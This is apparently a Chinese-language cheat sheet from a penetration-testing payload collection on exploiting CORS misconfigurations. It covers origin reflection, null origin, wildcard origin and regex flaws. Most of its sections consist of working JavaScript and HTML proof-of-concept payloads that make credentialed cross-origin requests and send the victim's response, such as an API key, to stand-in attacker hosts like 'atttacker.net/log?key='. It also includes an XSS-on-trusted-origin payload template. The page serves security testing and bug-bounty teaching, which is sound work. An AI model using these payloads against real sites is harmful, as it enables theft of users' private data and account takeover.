# CORS Misconfiguration - CORS配置错误

> API 域可能存在CORS（Cross-Origin Resource Sharing，跨域资源共享）配置错误。CORS配置错误将允许攻击者代表用户发出跨源请求，因为应用程序没有将 Origin 标头列入白名单，此外， Access-Control-Allow-Credentials: true 意味着我们可以使用受害者的凭据，从攻击者的站点发出请求。

## Summary - 总结


  - [Tools 工具](#tools-工具)
  - [Prerequisites - 先决条件](#prerequisites---先决条件)
  - [Exploitation - 利用](#exploitation---利用)
    - [Vulnerable Example: Origin Reflection - 反射Origin](#vulnerable-example-origin-reflection---反射origin)
      - [Vulnerable Implementation - 漏洞实现](#vulnerable-implementation---漏洞实现)
      - [Proof of concept - 概念验证](#proof-of-concept---概念验证)
    - [Vulnerable Example: Null Origin - 信任null](#vulnerable-example-null-origin---信任null)
      - [Vulnerable Implementation - 漏洞实现](#vulnerable-implementation---漏洞实现-1)
      - [Proof of concept - 概念验证](#proof-of-concept---概念验证-1)
    - [Vulnerable Example: XSS on Trusted Origin - 可信Origin的XSS](#vulnerable-example-xss-on-trusted-origin---可信origin的xss)
    - [Vulnerable Example: Wildcard Origin `*` without Credentials - Origin: * 与 Credentials: true 共用](#vulnerable-example-wildcard-origin--without-credentials---origin--与-credentials-true-共用)
      - [Vulnerable Implementation - 漏洞实现](#vulnerable-implementation---漏洞实现-2)
      - [Proof of concept - 概念验证](#proof-of-concept---概念验证-2)
    - [Vulnerable Example: Expanding the Origin / Regex Issues - 扩展Origin/正则问题](#vulnerable-example-expanding-the-origin--regex-issues---扩展origin正则问题)
      - [Vulnerable Implementation (Example 1) - 漏洞实现1](#vulnerable-implementation-example-1---漏洞实现1)
      - [Proof of concept (Example 1) - 概念验证1](#proof-of-concept-example-1---概念验证1)
      - [Vulnerable Implementation (Example 2) - 漏洞实现2](#vulnerable-implementation-example-2---漏洞实现2)
      - [Proof of concept (Example 2) - 概念验证2](#proof-of-concept-example-2---概念验证2)
  - [Labs](#labs)
  - [Bug Bounty reports](#bug-bounty-reports)
  - [References](#references)

## Tools 工具

- [s0md3v/Corsy - CORS Misconfiguration Scanner](https://github.com/s0md3v/Corsy/)
- [chenjj/CORScanner - Fast CORS misconfiguration vulnerabilities scanner](https://github.com/chenjj/CORScanner)
- [PostMessage POC Builder - @honoki](https://tools.honoki.net/postmessage.html)

## Prerequisites - 先决条件

- BURP HEADER> `Origin: https://evil.com`
- VICTIM HEADER> `Access-Control-Allow-Credential: true`
- VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` 或 `Access-Control-Allow-Origin: null`

## Exploitation - 利用

通常您希望以 API 端点为目标。使用以下payload来利用目标 `https://victim.example.com/endpoint` 上的 CORS 配置错误：

### Vulnerable Example: Origin Reflection - 反射Origin

#### Vulnerable Implementation - 漏洞实现

```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof of concept - 概念验证

此 PoC 要求相应的 JS 脚本托管在 `evil.com`：

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

或：

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### Vulnerable Example: Null Origin - 信任null

#### Vulnerable Implementation - 漏洞实现

服务器可能不返回完整的 Origin 标头，但允许 Origin为`null` 。这在服务器的响应中看起来像这样：

```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof of concept - 概念验证

这可以通过data URI scheme，将攻击代码放入 iframe 中利用。如果使用data URI scheme，浏览器将在请求中将Origin置为 `null`：

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### Vulnerable Example: XSS on Trusted Origin - 可信Origin的XSS

如果应用程序实施了严格的Origins白名单，则上面的漏洞利用代码将不起作用。但是，如果受信任的Origins上有 XSS漏洞，利用该XSS漏洞，将能够发送跨域请求到目标重要域网站。

```
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

### Vulnerable Example: Wildcard Origin `*` without Credentials - Origin: * 与 Credentials: true 共用

如果服务器使用通配符 origin `*` 进行响应，则**浏览器永远不会发送 cookie**。但是，如果服务器不需要进行身份验证，则仍然可以访问服务器上的数据。这一情况可能发生在无法从 Internet 访问的内部服务器上。攻击者的网站可以访问内部网络，并在未经身份验证的情况下访问服务器的数据。

```
* is the only wildcard origin
https://*.example.com is not valid
```

#### Vulnerable Implementation - 漏洞实现

```
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

#### Proof of concept - 概念验证

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

### Vulnerable Example: Expanding the Origin / Regex Issues - 扩展Origin/正则问题

有时，原始Origin的某些扩展不会在服务器端被过滤。这可能是由于使用执行不当的正则表达式来验证header造成的。

#### Vulnerable Implementation (Example 1) - 漏洞实现1

在这种情况下，服务器会接受在 `example.com` 前面插入的任何前缀。

```
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof of concept (Example 1) - 概念验证1

此 PoC 需要将相应的 JS 脚本托管在 `evilexample.com`：

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

#### Vulnerable Implementation (Example 2) - 漏洞实现2

在这种情况下，服务器使用正则表达式，其中 `.` 未正确转义。例如，`^api.example.com$` 而不是 `^api\.example.com$`。因此，可以将 `.` 替换为任何字母，以从第三方域获得访问权限。

```
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof of concept (Example 2) - 概念验证2

此 PoC 需要将相应的 JS 脚本托管在 `apiiexample.com`：

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

## Labs

- [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
- [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
- [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
- [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

## Bug Bounty reports

- [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax)](https://hackerone.com/reports/168574)
- [CORS misconfig | Account Takeover - niche.co - Rohan (nahoragg)](https://hackerone.com/reports/426147)
- [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy)](https://hackerone.com/reports/235200)
- [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t)](https://hackerone.com/reports/430249)
- [[██████\] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7)](https://hackerone.com/reports/470298)

## References

- [Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
- [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
- [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://www.corben.io/advanced-cors-techniques/)
- [PortSwigger Web Security Academy: CORS](https://portswigger.net/web-security/cors)
- [CORS Misconfigurations Explained - Detectify Blog](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)